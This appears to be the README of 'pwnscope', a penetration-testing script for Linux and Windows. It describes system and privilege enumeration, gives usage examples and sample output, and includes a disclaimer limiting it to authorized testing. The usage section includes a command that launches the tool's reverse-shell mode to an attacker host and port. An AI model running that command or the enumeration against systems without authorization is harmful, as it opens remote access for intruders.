# pwnscope

![grafik](https://github.com/user-attachments/assets/36d0ef20-da06-463b-a16e-dd0867944c78)


**pwnscope** is a lightweight Linux and Windows reconnaissance and minimal exploit toolkit script designed to help security professionals quickly gather system information and perform basic exploitation.
It's designed to run smarter and faster than other recon scripts yet. So just give it a try!

---

## Features

* Quick system overview (`--short`)
* Full enumeration including sudo privileges, SUID files, capabilities, cron jobs, network info, and Docker check (`--full`)
* Minimal reverse shell exploit via bash/sh (`--exploit`) requiring `LHOST` and `LPORT` environment variables

---

## Requirements

### Linux OS
* Bash or compatible shell (works with `/bin/bash`, `/bin/sh`, `ash`, etc.)
* Linux environment
* `sudo` privileges for some extended checks (optional)
* Basic utilities like `find`, `ps`, `ss`, `ip`, `free`, `df`, `getcap`

### Windows OS
* Admin rights
* Powershell exec bypass

---

## Usage Linux (Windows same with *.ps1 extension instead)

```bash
# Display help and usage
./pwnscope.sh

# Quick system info
./pwnscope.sh --short

# Full system enumeration
./pwnscope.sh --full

# Minimal reverse shell exploit
LHOST=10.10.10.4 LPORT=4444 ./pwnscope.sh --exploit
```

---

## Example Output

### Quick overview:

```
[*] Quick System Overview
Hostname: vulnserver
User: root
Kernel: 5.15.0-73-generic
Uptime: up 3 hours, 25 minutes
CPU Info: Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz
Memory Usage:
              total        used        free      shared  buff/cache   available
Mem:           3.7G        1.1G        1.5G         54M        1.1G        2.3G
Swap:          0B          0B          0B
Disk Usage (root):
/dev/sda1        50G        15G        33G   31% /
Top 5 processes by memory:
root       1234  4.2  3.1  987654 123456 ?    Sl   10:00   0:05 java
...
Open ports:
LISTEN   0      128         0.0.0.0:22          0.0.0.0:*  
LISTEN   0      128         127.0.0.1:5432      0.0.0.0:*  
...
```

---

## License

MIT License — see the [LICENSE](LICENSE) file for details.

---

## Disclaimer

This tool is intended for authorized penetration testing and security assessments only. Use responsibly and legally.
